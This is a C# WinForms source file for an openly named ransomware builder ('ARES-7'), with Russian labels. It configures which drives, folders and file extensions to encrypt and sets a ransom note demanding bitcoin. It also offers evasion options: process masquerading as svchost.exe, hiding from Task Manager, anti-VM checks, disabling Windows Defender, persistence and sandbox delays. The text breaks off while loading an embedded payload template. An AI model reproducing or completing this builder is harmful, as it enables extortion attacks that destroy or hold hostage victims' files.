using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        // ============================================================
        // КОМПОНЕНТЫ
        // ============================================================
        private TabControl tabControl;
        private ComboBox cbAlgorithm;
        private TextBox txtEncryptedExt;
        private CheckBox chkC, chkD, chkE, chkZ;
        private TextBox txtCustomDrive;
        private RichTextBox txtIncludeFolders;
        private RichTextBox txtExcludeFolders;
        private FlowLayoutPanel flpExtensions;
        private TextBox txtCustomExt;
        private Label lblWallpaper;
        private TextBox txtNoteName;
        private RichTextBox txtNoteContent;
        private CheckBox chkFakeProcess;
        private TextBox txtFakeProcessName;
        private CheckBox chkHideProcess;
        private CheckBox chkAntiVM;
        private CheckBox chkDisableDefender;
        private CheckBox chkAddPersistence;
        private CheckBox chkHideFilesAttr;
        private CheckBox chkSandboxDelay;
        private TextBox txtOutputName;
        private TextBox txtOutputPath;
        private TextBox txtIconPath;
        private Label lblStatus;
        private Label lblDetail;
        private ProgressBar progressBar;
        private Button btnBuild;
        private Button btnSelectIcon;
        private Button btnSelectPath;
        private Button btnWallpaper;
        
        private List<string> drives = new List<string>();
        private string wallpaperPath = "";
        private string iconPath = "";
        private List<CheckBox> extCheckboxes = new List<CheckBox>();
        
        // ============================================================
        // ЦВЕТА (ВЕЗДЕ ЗЕЛЁНЫЙ!)
        // ============================================================
        private Color bgColor = Color.FromArgb(10, 10, 10);
        private Color fgColor = Color.FromArgb(0, 255, 65);
        private Color accentColor = Color.FromArgb(0, 204, 51);
        private Color darkColor = Color.FromArgb(17, 17, 17);
        private Color grayColor = Color.FromArgb(68, 68, 68);
        private Color errorColor = Color.FromArgb(255, 51, 51);
        private Color successColor = Color.FromArgb(0, 255, 65);
        private Color yellowColor = Color.FromArgb(255, 170, 0);
        
        // ============================================================
        // КОНСТРУКТОР
        // ============================================================
        public Form1()
        {
            InitializeComponent();
            LoadExtensions();
            LoadDefaultSettings();
            ApplyTheme();
        }
        
        private void ApplyTheme()
        {
            this.BackColor = bgColor;
            this.ForeColor = fgColor;
            foreach (Control ctrl in this.Controls)
                ApplyThemeToControl(ctrl);
        }
        
        private void ApplyThemeToControl(Control ctrl)
        {
            if (ctrl is Label lbl)
            {
                lbl.BackColor = bgColor;
                lbl.ForeColor = fgColor;
            }
            else if (ctrl is Button btn)
            {
                btn.BackColor = darkColor;
                btn.ForeColor = fgColor;
                btn.FlatStyle = FlatStyle.Flat;
                btn.FlatAppearance.BorderColor = fgColor;
            }
            else if (ctrl is TextBox txt)
            {
                txt.BackColor = darkColor;
                txt.ForeColor = fgColor;
                txt.BorderStyle = BorderStyle.FixedSingle;
            }
            else if (ctrl is RichTextBox rtb)
            {
                rtb.BackColor = darkColor;
                rtb.ForeColor = fgColor; // ← ЗЕЛЁНЫЙ ТЕКСТ!
                rtb.BorderStyle = BorderStyle.FixedSingle;
                rtb.Padding = new Padding(3);
            }
            else if (ctrl is ComboBox cb)
            {
                cb.BackColor = darkColor;
                cb.ForeColor = fgColor;
                cb.FlatStyle = FlatStyle.Flat;
            }
            else if (ctrl is CheckBox chk)
            {
                chk.BackColor = bgColor;
                chk.ForeColor = fgColor;
            }
            else if (ctrl is FlowLayoutPanel flp)
            {
                flp.BackColor = bgColor;
            }
            else if (ctrl is TabControl tc)
            {
                tc.BackColor = bgColor;
                tc.ForeColor = fgColor;
            }
            else if (ctrl is Panel pnl)
            {
                pnl.BackColor = bgColor;
            }
            
            foreach (Control child in ctrl.Controls)
                ApplyThemeToControl(child);
        }
        
        // ============================================================
        // ИНИЦИАЛИЗАЦИЯ
        // ============================================================
        private void InitializeComponent()
        {
            this.Text = "🔐 ARES-7 Ransomware Builder v6.0";
            this.Size = new Size(1150, 850);
            this.BackColor = bgColor;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.MinimumSize = new Size(1000, 750);
            
            tabControl = new TabControl();
            tabControl.Dock = DockStyle.Fill;
            tabControl.BackColor = bgColor;
            tabControl.ForeColor = fgColor;
            
            tabControl.DrawMode = TabDrawMode.OwnerDrawFixed;
            tabControl.DrawItem += (s, e) => {
                var tab = tabControl.TabPages[e.Index];
                e.Graphics.FillRectangle(new SolidBrush(darkColor), e.Bounds);
                TextRenderer.DrawText(e.Graphics, tab.Text, new Font("Segoe UI", 10, FontStyle.Bold), e.Bounds, fgColor);
                if (e.State == DrawItemState.Selected)
                {
                    e.Graphics.FillRectangle(new SolidBrush(accentColor), e.Bounds);
                    TextRenderer.DrawText(e.Graphics, tab.Text, new Font("Segoe UI", 10, FontStyle.Bold), e.Bounds, Color.Black);
                }
            };
            
            tabControl.TabPages.Add(CreateTabEncryption());
            tabControl.TabPages.Add(CreateTabExtensions());
            tabControl.TabPages.Add(CreateTabWallpaper());
            tabControl.TabPages.Add(CreateTabStealth());
            tabControl.TabPages.Add(CreateTabBuild());
            
            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 150;
            bottomPanel.BackColor = bgColor;
            
            btnBuild = new Button();
            btnBuild.Text = "🔥 ПОСТРОИТЬ RANSOMWARE";
            btnBuild.Dock = DockStyle.Bottom;
            btnBuild.Height = 60;
            btnBuild.BackColor = accentColor;
            btnBuild.ForeColor = Color.Black;
            btnBuild.Font = new Font("Segoe UI", 14, FontStyle.Bold);
            btnBuild.FlatStyle = FlatStyle.Flat;
            btnBuild.FlatAppearance.BorderSize = 0;
            btnBuild.Click += BtnBuild_Click;
            
            lblStatus = new Label();
            lblStatus.Dock = DockStyle.Bottom;
            lblStatus.Text = "✅ Готов к сборке";
            lblStatus.ForeColor = grayColor;
            lblStatus.Font = new Font("Segoe UI", 10, FontStyle.Bold);
            lblStatus.Height = 30;
            lblStatus.BackColor = bgColor;
            
            lblDetail = new Label();
            lblDetail.Dock = DockStyle.Bottom;
            lblDetail.Text = "";
            lblDetail.ForeColor = grayColor;
            lblDetail.Font = new Font("Segoe UI", 9);
            lblDetail.Height = 25;
            lblDetail.BackColor = bgColor;
            
            progressBar = new ProgressBar();
            progressBar.Dock = DockStyle.Bottom;
            progressBar.Style = ProgressBarStyle.Marquee;
            progressBar.Visible = false;
            progressBar.Height = 20;
            progressBar.BackColor = darkColor;
            progressBar.ForeColor = fgColor;
            
            bottomPanel.Controls.Add(btnBuild);
            bottomPanel.Controls.Add(progressBar);
            bottomPanel.Controls.Add(lblStatus);
            bottomPanel.Controls.Add(lblDetail);
            
            this.Controls.Add(tabControl);
            this.Controls.Add(bottomPanel);
        }
        
        // ============================================================
        // ВКЛАДКИ (ВЕЗДЕ ЗЕЛЁНЫЙ ТЕКСТ)
        // ============================================================
        private TabPage CreateTabEncryption()
        {
            var tab = new TabPage("⚙ Шифрование");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.ColumnCount = 2;
            panel.RowCount = 6;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 200));
            panel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 50));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 50));
            
            panel.Controls.Add(CreateLabel("Алгоритм шифрования:", fgColor, true), 0, 0);
            cbAlgorithm = new ComboBox();
            cbAlgorithm.Items.AddRange(new object[] { "AES-256", "Salsa20", "RSA" });
            cbAlgorithm.SelectedIndex = 0;
            cbAlgorithm.BackColor = darkColor;
            cbAlgorithm.ForeColor = fgColor;
            cbAlgorithm.FlatStyle = FlatStyle.Flat;
            cbAlgorithm.Font = new Font("Consolas", 10);
            cbAlgorithm.Dock = DockStyle.Fill;
            panel.Controls.Add(cbAlgorithm, 1, 0);
            
            panel.Controls.Add(CreateLabel("Расширение зашифрованных:", fgColor, true), 0, 1);
            txtEncryptedExt = new TextBox();
            txtEncryptedExt.Text = ".enc";
            txtEncryptedExt.BackColor = darkColor;
            txtEncryptedExt.ForeColor = fgColor;
            txtEncryptedExt.BorderStyle = BorderStyle.FixedSingle;
            txtEncryptedExt.Font = new Font("Consolas", 10);
            txtEncryptedExt.Dock = DockStyle.Fill;
            panel.Controls.Add(txtEncryptedExt, 1, 1);
            
            panel.Controls.Add(CreateLabel("Диски для шифрования:", fgColor, true), 0, 2);
            var drivesPanel = new FlowLayoutPanel();
            drivesPanel.BackColor = bgColor;
            drivesPanel.Dock = DockStyle.Fill;
            
            chkC = new CheckBox(); chkC.Text = "C:\\"; chkC.ForeColor = fgColor; chkC.BackColor = bgColor; chkC.Font = new Font("Consolas", 10);
            chkD = new CheckBox(); chkD.Text = "D:\\"; chkD.ForeColor = fgColor; chkD.BackColor = bgColor; chkD.Font = new Font("Consolas", 10);
            chkE = new CheckBox(); chkE.Text = "E:\\"; chkE.ForeColor = fgColor; chkE.BackColor = bgColor; chkE.Font = new Font("Consolas", 10);
            chkZ = new CheckBox(); chkZ.Text = "Z:\\"; chkZ.ForeColor = fgColor; chkZ.BackColor = bgColor; chkZ.Font = new Font("Consolas", 10);
            
            drivesPanel.Controls.AddRange(new Control[] { chkC, chkD, chkE, chkZ });
            panel.Controls.Add(drivesPanel, 1, 2);
            
            panel.Controls.Add(CreateLabel("Добавить диск:", fgColor, true), 0, 3);
            var addDrivePanel = new FlowLayoutPanel();
            addDrivePanel.BackColor = bgColor;
            addDrivePanel.Dock = DockStyle.Fill;
            
            txtCustomDrive = new TextBox();
            txtCustomDrive.Width = 120;
            txtCustomDrive.BackColor = darkColor;
            txtCustomDrive.ForeColor = fgColor;
            txtCustomDrive.BorderStyle = BorderStyle.FixedSingle;
            txtCustomDrive.Font = new Font("Consolas", 10);
            
            var btnAddDrive = new Button();
            btnAddDrive.Text = "➕ Добавить";
            btnAddDrive.BackColor = darkColor;
            btnAddDrive.ForeColor = fgColor;
            btnAddDrive.FlatStyle = FlatStyle.Flat;
            btnAddDrive.Font = new Font("Consolas", 10);
            btnAddDrive.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtCustomDrive.Text))
                {
                    var chk = new CheckBox();
                    chk.Text = txtCustomDrive.Text;
                    chk.ForeColor = fgColor;
                    chk.BackColor = bgColor;
                    chk.Font = new Font("Consolas", 10);
                    drivesPanel.Controls.Add(chk);
                    MessageBox.Show($"Диск {txtCustomDrive.Text} добавлен");
                    txtCustomDrive.Text = "";
                }
            };
            
            addDrivePanel.Controls.AddRange(new Control[] { txtCustomDrive, btnAddDrive });
            panel.Controls.Add(addDrivePanel, 1, 3);
            
            panel.Controls.Add(CreateLabel("Папки для шифрования:", fgColor, true), 0, 4);
            txtIncludeFolders = new RichTextBox();
            txtIncludeFolders.BackColor = darkColor;
            txtIncludeFolders.ForeColor = fgColor; // ← ЗЕЛЁНЫЙ!
            txtIncludeFolders.BorderStyle = BorderStyle.FixedSingle;
            txtIncludeFolders.Font = new Font("Consolas", 9);
            txtIncludeFolders.Dock = DockStyle.Fill;
            panel.Controls.Add(txtIncludeFolders, 1, 4);
            
            panel.Controls.Add(CreateLabel("Папки для обхода:", fgColor, true), 0, 5);
            txtExcludeFolders = new RichTextBox();
            txtExcludeFolders.BackColor = darkColor;
            txtExcludeFolders.ForeColor = fgColor; // ← ЗЕЛЁНЫЙ!
            txtExcludeFolders.BorderStyle = BorderStyle.FixedSingle;
            txtExcludeFolders.Font = new Font("Consolas", 9);
            txtExcludeFolders.Dock = DockStyle.Fill;
            txtExcludeFolders.Text = "C:\\Windows\r\nC:\\Program Files\r\nC:\\Program Files (x86)";
            panel.Controls.Add(txtExcludeFolders, 1, 5);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabExtensions()
        {
            var tab = new TabPage("📁 Расширения");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 3;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            var headerPanel = new FlowLayoutPanel();
            headerPanel.BackColor = bgColor;
            headerPanel.Dock = DockStyle.Fill;
            headerPanel.Controls.Add(CreateLabel("Выберите расширения файлов для шифрования:", fgColor, true));
            
            var btnSelectAll = new Button();
            btnSelectAll.Text = "Выбрать все";
            btnSelectAll.BackColor = darkColor;
            btnSelectAll.ForeColor = fgColor;
            btnSelectAll.FlatStyle = FlatStyle.Flat;
            btnSelectAll.Font = new Font("Consolas", 9);
            btnSelectAll.Click += (s, e) => { foreach (var chk in extCheckboxes) chk.Checked = true; };
            headerPanel.Controls.Add(btnSelectAll);
            
            var btnDeselectAll = new Button();
            btnDeselectAll.Text = "Снять все";
            btnDeselectAll.BackColor = darkColor;
            btnDeselectAll.ForeColor = fgColor;
            btnDeselectAll.FlatStyle = FlatStyle.Flat;
            btnDeselectAll.Font = new Font("Consolas", 9);
            btnDeselectAll.Click += (s, e) => { foreach (var chk in extCheckboxes) chk.Checked = false; };
            headerPanel.Controls.Add(btnDeselectAll);
            
            panel.Controls.Add(headerPanel, 0, 0);
            
            flpExtensions = new FlowLayoutPanel();
            flpExtensions.Dock = DockStyle.Fill;
            flpExtensions.FlowDirection = FlowDirection.LeftToRight;
            flpExtensions.WrapContents = true;
            flpExtensions.BackColor = bgColor;
            flpExtensions.AutoScroll = true;
            flpExtensions.Padding = new Padding(5);
            panel.Controls.Add(flpExtensions, 0, 1);
            
            var addPanel = new FlowLayoutPanel();
            addPanel.BackColor = bgColor;
            addPanel.Dock = DockStyle.Fill;
            
            addPanel.Controls.Add(CreateLabel("Добавить своё расширение:", fgColor, false));
            txtCustomExt = new TextBox();
            txtCustomExt.Width = 120;
            txtCustomExt.BackColor = darkColor;
            txtCustomExt.ForeColor = fgColor;
            txtCustomExt.BorderStyle = BorderStyle.FixedSingle;
            txtCustomExt.Font = new Font("Consolas", 10);
            addPanel.Controls.Add(txtCustomExt);
            
            var btnAddExt = new Button();
            btnAddExt.Text = "➕ Добавить";
            btnAddExt.BackColor = darkColor;
            btnAddExt.ForeColor = fgColor;
            btnAddExt.FlatStyle = FlatStyle.Flat;
            btnAddExt.Font = new Font("Consolas", 10);
            btnAddExt.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtCustomExt.Text))
                {
                    var chk = new CheckBox();
                    chk.Text = txtCustomExt.Text;
                    chk.ForeColor = fgColor;
                    chk.BackColor = bgColor;
                    chk.Font = new Font("Consolas", 9);
                    chk.Checked = true;
                    flpExtensions.Controls.Add(chk);
                    extCheckboxes.Add(chk);
                    txtCustomExt.Text = "";
                }
            };
            addPanel.Controls.Add(btnAddExt);
            
            panel.Controls.Add(addPanel, 0, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private void LoadExtensions()
        {
            string[] extList = {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
                ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".raw",
                ".mp3", ".wav", ".wma", ".aac", ".flac", ".ogg", ".m4a",
                ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".mpeg",
                ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz",
                ".exe", ".dll", ".sys", ".msi", ".apk", ".app", ".deb", ".rpm",
                ".py", ".js", ".html", ".css", ".php", ".asp", ".jsp", ".xml", ".json",
                ".sql", ".db", ".mdb", ".accdb", ".sqlite",
                ".pem", ".key", ".crt", ".csr", ".pfx", ".p12",
                ".vmdk", ".vhd", ".vdi", ".qcow2",
                ".iso", ".img", ".bin", ".cue",
                ".log", ".bak", ".old", ".tmp", ".swp",
                ".cs", ".cpp", ".c", ".h", ".java", ".class", ".rb", ".go", ".rs"
            };
            
            foreach (var ext in extList)
            {
                var chk = new CheckBox();
                chk.Text = ext;
                chk.ForeColor = fgColor;
                chk.BackColor = bgColor;
                chk.Font = new Font("Consolas", 9);
                chk.Checked = true;
                chk.Margin = new Padding(4, 2, 4, 2);
                flpExtensions.Controls.Add(chk);
                extCheckboxes.Add(chk);
            }
        }
        
        private TabPage CreateTabWallpaper()
        {
            var tab = new TabPage("🖼 Обои / Выкуп");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 4;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            panel.Controls.Add(CreateLabel("Файл обоев (JPG/PNG/BMP):", fgColor, true), 0, 0);
            var wallPanel = new FlowLayoutPanel();
            wallPanel.BackColor = bgColor;
            wallPanel.Dock = DockStyle.Fill;
            
            lblWallpaper = new Label();
            lblWallpaper.Text = "Не выбрано";
            lblWallpaper.ForeColor = grayColor;
            lblWallpaper.AutoSize = true;
            lblWallpaper.BackColor = bgColor;
            wallPanel.Controls.Add(lblWallpaper);
            
            btnWallpaper = new Button();
            btnWallpaper.Text = "📂 Выбрать";
            btnWallpaper.BackColor = darkColor;
            btnWallpaper.ForeColor = fgColor;
            btnWallpaper.FlatStyle = FlatStyle.Flat;
            btnWallpaper.Font = new Font("Consolas", 10);
            btnWallpaper.Click += (s, e) => {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "Images|*.jpg;*.jpeg;*.png;*.bmp";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        wallpaperPath = ofd.FileName;
                        lblWallpaper.Text = Path.GetFileName(ofd.FileName);
                        lblWallpaper.ForeColor = fgColor;
                    }
                }
            };
            wallPanel.Controls.Add(btnWallpaper);
            wallPanel.Controls.Add(CreateLabel("(JPG, PNG, BMP)", grayColor, false));
            panel.Controls.Add(wallPanel, 1, 0);
            
            panel.Controls.Add(CreateLabel("Имя файла выкупа:", fgColor, true), 0, 1);
            var noteNamePanel = new FlowLayoutPanel();
            noteNamePanel.BackColor = bgColor;
            noteNamePanel.Dock = DockStyle.Fill;
            
            txtNoteName = new TextBox();
            txtNoteName.Text = "READ_ME.txt";
            txtNoteName.Width = 200;
            txtNoteName.BackColor = darkColor;
            txtNoteName.ForeColor = fgColor;
            txtNoteName.BorderStyle = BorderStyle.FixedSingle;
            txtNoteName.Font = new Font("Consolas", 10);
            noteNamePanel.Controls.Add(txtNoteName);
            noteNamePanel.Controls.Add(CreateLabel("(например: READ_ME.txt)", grayColor, false));
            panel.Controls.Add(noteNamePanel, 1, 1);
            
            panel.Controls.Add(CreateLabel("Содержимое файла выкупа:", fgColor, true), 0, 2);
            txtNoteContent = new RichTextBox();
            txtNoteContent.BackColor = darkColor;
            txtNoteContent.ForeColor = fgColor; // ← ЗЕЛЁНЫЙ!
            txtNoteContent.BorderStyle = BorderStyle.FixedSingle;
            txtNoteContent.Font = new Font("Consolas", 9);
            txtNoteContent.Dock = DockStyle.Fill;
            txtNoteContent.Text = "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com";
            panel.Controls.Add(txtNoteContent, 1, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabStealth()
        {
            var tab = new TabPage("🕵 Скрытность");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 5;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            int row = 0;
            
            panel.Controls.Add(CreateLabel("Маскировка процесса:", Color.White, true), 0, row);
            var fakePanel = new FlowLayoutPanel();
            fakePanel.BackColor = bgColor;
            fakePanel.Dock = DockStyle.Fill;
            
            chkFakeProcess = new CheckBox();
            chkFakeProcess.Text = "Включить фейк-процесс";
            chkFakeProcess.ForeColor = fgColor;
            chkFakeProcess.BackColor = bgColor;
            chkFakeProcess.Font = new Font("Segoe UI", 10);
            fakePanel.Controls.Add(chkFakeProcess);
            
            txtFakeProcessName = new TextBox();
            txtFakeProcessName.Text = "svchost.exe";
            txtFakeProcessName.Width = 120;
            txtFakeProcessName.BackColor = darkColor;
            txtFakeProcessName.ForeColor = fgColor;
            txtFakeProcessName.BorderStyle = BorderStyle.FixedSingle;
            txtFakeProcessName.Font = new Font("Consolas", 10);
            fakePanel.Controls.Add(txtFakeProcessName);
            fakePanel.Controls.Add(CreateLabel("(имя в диспетчере)", grayColor, false));
            
            panel.Controls.Add(fakePanel, 1, row++);
            
            panel.Controls.Add(CreateLabel("Скрытие процесса:", Color.White, true), 0, row);
            chkHideProcess = new CheckBox();
            chkHideProcess.Text = "Полное скрытие из Task Manager (требует админ-прав)";
            chkHideProcess.ForeColor = fgColor;
            chkHideProcess.BackColor = bgColor;
            chkHideProcess.Font = new Font("Segoe UI", 10);
            panel.Controls.Add(chkHideProcess, 1, row++);
            
            panel.Controls.Add(CreateLabel("Анти-VM:", Color.White, true), 0, row);
            chkAntiVM = new CheckBox();
            chkAntiVM.Text = "Завершить работу при обнаружении виртуальной машины";
            chkAntiVM.ForeColor = fgColor;
            chkAntiVM.BackColor = bgColor;
            chkAntiVM.Font = new Font("Segoe UI", 10);
            panel.Controls.Add(chkAntiVM, 1, row++);
            
            panel.Controls.Add(CreateLabel("Дополнительные методы обхода:", Color.White, true), 0, row);
            var extraPanel = new FlowLayoutPanel();
            extraPanel.FlowDirection = FlowDirection.TopDown;
            extraPanel.BackColor = bgColor;
            extraPanel.Dock = DockStyle.Fill;
            
            chkDisableDefender = new CheckBox();
            chkDisableDefender.Text = "Отключение Windows Defender";
            chkDisableDefender.ForeColor = fgColor;
            chkDisableDefender.BackColor = bgColor;
            chkDisableDefender.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkDisableDefender);
            
            chkAddPersistence = new CheckBox();
            chkAddPersistence.Text = "Добавление в автозагрузку";
            chkAddPersistence.ForeColor = fgColor;
            chkAddPersistence.BackColor = bgColor;
            chkAddPersistence.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkAddPersistence);
            
            chkHideFilesAttr = new CheckBox();
            chkHideFilesAttr.Text = "Скрытие файлов (атрибут +h)";
            chkHideFilesAttr.ForeColor = fgColor;
            chkHideFilesAttr.BackColor = bgColor;
            chkHideFilesAttr.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkHideFilesAttr);
            
            chkSandboxDelay = new CheckBox();
            chkSandboxDelay.Text = "Задержка 60 сек (обход песочниц)";
            chkSandboxDelay.ForeColor = fgColor;
            chkSandboxDelay.BackColor = bgColor;
            chkSandboxDelay.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkSandboxDelay);
            
            panel.Controls.Add(extraPanel, 1, row++);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabBuild()
        {
            var tab = new TabPage("📦 Сборка");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 4;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            panel.Controls.Add(CreateLabel("Имя выходного файла:", fgColor, true), 0, 0);
            var namePanel = new FlowLayoutPanel();
            namePanel.BackColor = bgColor;
            namePanel.Dock = DockStyle.Fill;
            
            txtOutputName = new TextBox();
            txtOutputName.Text = "ransomware.exe";
            txtOutputName.Width = 200;
            txtOutputName.BackColor = darkColor;
            txtOutputName.ForeColor = fgColor;
            txtOutputName.BorderStyle = BorderStyle.FixedSingle;
            txtOutputName.Font = new Font("Consolas", 10);
            namePanel.Controls.Add(txtOutputName);
            namePanel.Controls.Add(CreateLabel("(например: update.exe)", grayColor, false));
            panel.Controls.Add(namePanel, 1, 0);
            
            panel.Controls.Add(CreateLabel("Путь сохранения:", fgColor, true), 0, 1);
            var pathPanel = new FlowLayoutPanel();
            pathPanel.BackColor = bgColor;
            pathPanel.Dock = DockStyle.Fill;
            
            txtOutputPath = new TextBox();
            txtOutputPath.Text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            txtOutputPath.Width = 300;
            txtOutputPath.BackColor = darkColor;
            txtOutputPath.ForeColor = fgColor;
            txtOutputPath.BorderStyle = BorderStyle.FixedSingle;
            txtOutputPath.Font = new Font("Consolas", 10);
            pathPanel.Controls.Add(txtOutputPath);
            
            btnSelectPath = new Button();
            btnSelectPath.Text = "📂 Обзор";
            btnSelectPath.BackColor = darkColor;
            btnSelectPath.ForeColor = fgColor;
            btnSelectPath.FlatStyle = FlatStyle.Flat;
            btnSelectPath.Font = new Font("Consolas", 10);
            btnSelectPath.Click += (s, e) => {
                using (var fbd = new FolderBrowserDialog())
                {
                    if (fbd.ShowDialog() == DialogResult.OK)
                        txtOutputPath.Text = fbd.SelectedPath;
                }
            };
            pathPanel.Controls.Add(btnSelectPath);
            panel.Controls.Add(pathPanel, 1, 1);
            
            panel.Controls.Add(CreateLabel("Иконка для шифровальщика (.ico):", fgColor, true), 0, 2);
            var iconPanel = new FlowLayoutPanel();
            iconPanel.BackColor = bgColor;
            iconPanel.Dock = DockStyle.Fill;
            
            var lblIcon = new Label();
            lblIcon.Text = "Не выбрано";
            lblIcon.ForeColor = grayColor;
            lblIcon.BackColor = bgColor;
            iconPanel.Controls.Add(lblIcon);
            
            btnSelectIcon = new Button();
            btnSelectIcon.Text = "📂 Выбрать";
            btnSelectIcon.BackColor = darkColor;
            btnSelectIcon.ForeColor = fgColor;
            btnSelectIcon.FlatStyle = FlatStyle.Flat;
            btnSelectIcon.Font = new Font("Consolas", 10);
            btnSelectIcon.Click += (s, e) => {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "ICO files|*.ico";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        iconPath = ofd.FileName;
                        lblIcon.Text = Path.GetFileName(ofd.FileName);
                        lblIcon.ForeColor = fgColor;
                    }
                }
            };
            iconPanel.Controls.Add(btnSelectIcon);
            iconPanel.Controls.Add(CreateLabel("(только .ico)", grayColor, false));
            panel.Controls.Add(iconPanel, 1, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        // ============================================================
        // ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ
        // ============================================================
        private Label CreateLabel(string text, Color color, bool bold)
        {
            var lbl = new Label();
            lbl.Text = text;
            lbl.ForeColor = color;
            lbl.Font = new Font(bold ? "Segoe UI" : "Segoe UI", bold ? 10 : 9, bold ? FontStyle.Bold : FontStyle.Regular);
            lbl.AutoSize = true;
            lbl.BackColor = bgColor;
            return lbl;
        }
        
        private void LoadDefaultSettings()
        {
            chkC.Checked = true;
        }
        
        private List<string> GetSelectedExtensions()
        {
            var result = new List<string>();
            foreach (var chk in extCheckboxes)
                if (chk.Checked)
                    result.Add(chk.Text);
            return result;
        }
        
        // ============================================================
        // ОСНОВНАЯ ЛОГИКА СБОРКИ (РЕСУРСЫ ДЛЯ ОБОЕВ И ИКОНКИ)
        // ============================================================
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                lblStatus.Text = "⏳ Начинаем сборку...";
                lblStatus.ForeColor = yellowColor;
                progressBar.Visible = true;
                btnBuild.Enabled = false;
                
                string algorithm = cbAlgorithm.SelectedItem?.ToString() ?? "AES-256";
                int algoValue = algorithm == "AES-256" ? 0 : algorithm == "Salsa20" ? 1 : 2;
                
                List<string> selectedDrives = new List<string>();
                if (chkC.Checked) selectedDrives.Add("C:\\");
                if (chkD.Checked) selectedDrives.Add("D:\\");
                if (chkE.Checked) selectedDrives.Add("E:\\");
                if (chkZ.Checked) selectedDrives.Add("Z:\\");
                
                if (selectedDrives.Count == 0)
                {
                    MessageBox.Show("Выберите хотя бы один диск!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    btnBuild.Enabled = true;
                    progressBar.Visible = false;
                    lblStatus.Text = "❌ Ошибка: выберите диск";
                    lblStatus.ForeColor = errorColor;
                    return;
                }
                
                List<string> selectedExts = GetSelectedExtensions();
                string encryptedExt = txtEncryptedExt.Text;
                string noteName = txtNoteName.Text;
                string noteContent = txtNoteContent.Text;
                string outputName = txtOutputName.Text;
                string outputPath = txtOutputPath.Text;
                
                lblDetail.Text = "📋 Сбор параметров...";
                
                byte[] template;
                using (var stream = GetType().Assembly.GetManifestResourceStream("RansomwareBuilder.template.exe"))
                {
                    if (stream == null)
                    {
